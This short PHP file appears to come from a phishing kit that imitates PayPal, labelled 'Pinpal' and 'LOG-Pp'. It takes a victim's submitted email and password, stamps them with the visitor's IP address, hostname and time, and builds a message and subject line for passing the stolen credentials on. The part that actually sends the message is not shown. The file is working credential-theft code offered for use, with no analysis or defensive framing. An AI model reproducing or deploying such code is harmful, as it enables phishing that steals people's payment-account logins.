<?php


	$ip = getenv("REMOTE_ADDR");
	$datamasii=date("D M d, Y - g:i a");
	$hostname = gethostbyaddr($ip);


$login_email = $l[0];
$login_password = $l[1];

$msg = "
email: $login_email
pass: $login_password
---------------------------------------------
time : $datamasii
ip : $ip
===================== Pinpal =====================
";
$subject = "LOG-Pp  | $ip";



?>